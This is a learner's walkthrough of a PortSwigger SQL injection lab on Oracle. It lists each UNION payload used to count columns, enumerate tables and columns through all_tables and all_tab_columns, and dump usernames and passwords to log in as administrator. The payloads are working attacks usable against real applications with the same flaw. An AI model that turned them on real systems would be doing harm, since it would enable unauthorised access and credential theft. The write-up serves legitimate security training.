# SQL injection attack, listing the database contents on Oracle
- SQL injection vulnerability in the product category filter
- results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables\
- application has a login function, and the database contains a table that holds usernames and passwords
- To solve the lab, log in as the administrator user.
# Goal
- determine the name of this table and the columns it contains
- retrieve the contents of the table to obtain the username and password of all users
# Solving The Lab
- First Find Number of Columns with go to burp intercept request with pets clicked and send to repeater
```
' ORDER by 1--
```
- url encode and change the value untill we got and 3 internal server error so columns are 2
- now to the columns type we try string but we got internal server error since its oracle db we need to use from clause and point it to a dumy table
```
' UNION SELECT 'a','a' FROM DUAL--
```
- and we got a 200 in response
- now to output db tables
```
SELECT * FROM all_tables
```
- this is the default way for oracle to ouput tables now we need to refactor it for our union payload
- we search for all_tables column names for oracle and find column TABLE_NAME make sure to insert null as the other column cuz we have 2 columns
```
' UNION SELECT table_name, 'a' FROM all_tables--
```
- and 200 in response and tables are shown now look for users table and we find one which is 'USERS_HIOMBV'
- now we need to find column names like portswigger
```
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```
- refactor it for the payload first find column name associadted with all_tab_columns
- and found it which is 'COLUMN_NAME' now add it with null because we have 2 columns
```
' UNION SELECT COLUMN_NAME,NULL FROM all_tab_columns WHERE table_name = 'USERS_HIOMBV'--
```
- we got 200 and found in response 2 columns
```
USERNAME_JRARNR
PASSWORD_KSJJOK
```
- now to final payload to ouput username and passwords 
```
' UNION SELECT USERNAME_JRARNR,PASSWORD_KSJJOK FROM USERS_HIOMBV--
```
- voila we got 200 in response with users and their password now login with the administartor creds and we solved the lab

